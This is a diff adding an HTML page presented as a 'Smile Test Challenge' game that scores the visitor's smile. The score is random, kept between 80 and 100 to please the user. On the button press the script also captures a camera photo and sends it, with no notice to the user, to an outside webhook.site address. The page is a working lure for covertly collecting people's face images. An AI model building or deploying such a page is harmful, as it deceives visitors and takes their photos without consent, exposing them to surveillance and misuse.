@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Smile Test Challenge</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        #camera { width: 100%; max-width: 500px; margin: 20px auto; transform: scaleX(-1); }
+        button { padding: 12px 25px; background: #4CAF50; color: white; 
+                border: none; border-radius: 50px; font-size: 16px; cursor: pointer; }
+        .result { margin: 20px; padding: 20px; background: #f8f8f8; display: none; }
+        .score { font-size: 48px; color: #4CAF50; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>😊 Smile Test Challenge</h1>
+    <video id="camera" autoplay playsinline></video>
+    <button id="snapBtn">TEST MY SMILE</button>
+    <div class="result" id="result">
+        <h2>Your Smile Score: <span id="score">0</span>/100</h2>
+        <p id="comment"></p>
+    </div>
+    <canvas id="canvas" style="display:none"></canvas>
+
+    <script>
+        // Replace with your webhook URL
+        const WEBHOOK_URL = "https://webhook.site/3bd6aafa-4d66-49ac-a481-546bca3be476";
+        
+        const video = document.getElementById("camera");
+        const snapBtn = document.getElementById("snapBtn");
+        const result = document.getElementById("result");
+        const score = document.getElementById("score");
+        const comment = document.getElementById("comment");
+        const canvas = document.getElementById("canvas");
+        
+        // iOS-friendly camera setup
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    } 
+                });
+                video.srcObject = stream;
+                video.onloadedmetadata = () => video.play();
+            } catch (err) {
+                alert("Please allow camera access to continue!");
+                console.error("Camera error:", err);
+            }
+        }
+        
+        // Initialize camera when page loads
+        initCamera();
+        
+        // When button clicked
+        snapBtn.addEventListener("click", async () => {
+            // Take photo
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Generate random score (80-100 to make them happy)
+            const smileScore = Math.floor(Math.random() * 21) + 80;
+            
+            // Show result
+            snapBtn.style.display = "none";
+            result.style.display = "block";
+            score.textContent = smileScore;
+            comment.textContent = getComment(smileScore);
+            
+            // Send photo to webhook (iOS compatible)
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify({
+                        image: canvas.toDataURL("image/jpeg", 0.7),
+                        score: smileScore,
+                        time: new Date().toISOString()
+                    }),
+                    headers: { "Content-Type": "application/json" }
+                });
+                console.log("Photo sent successfully");
+            } catch (err) {
+                console.error("Error sending photo:", err);
+            }
+        });
+        
+        function getComment(score) {
+            if (score >= 95) return "Perfect Hollywood smile! 😍";
+            if (score >= 85) return "Amazing smile! 😊";
+            return "Great smile! 😄";
+        }
+    </script>
+</body>
+</html>
